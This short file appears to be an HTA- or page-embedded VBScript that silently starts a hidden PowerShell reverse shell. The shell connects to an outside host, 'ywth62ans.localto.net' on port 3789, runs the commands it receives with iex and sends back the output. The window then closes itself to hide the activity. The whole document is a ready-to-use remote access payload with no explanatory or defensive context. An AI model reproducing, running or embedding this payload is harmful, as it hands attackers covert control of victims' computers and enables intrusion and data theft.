<script language="VBScript">
    Set WshShell = CreateObject("WScript.Shell")
    cmd = "powershell.exe -nop -win hidden -c $c=New-Object System.Net.Sockets.TCPClient('ywth62ans.localto.net',3789);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$snb=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($snb,0,$snb.Length);$s.Flush()};$c.Close()"
    WshShell.Run cmd, 0, False
    window.close()
</script>
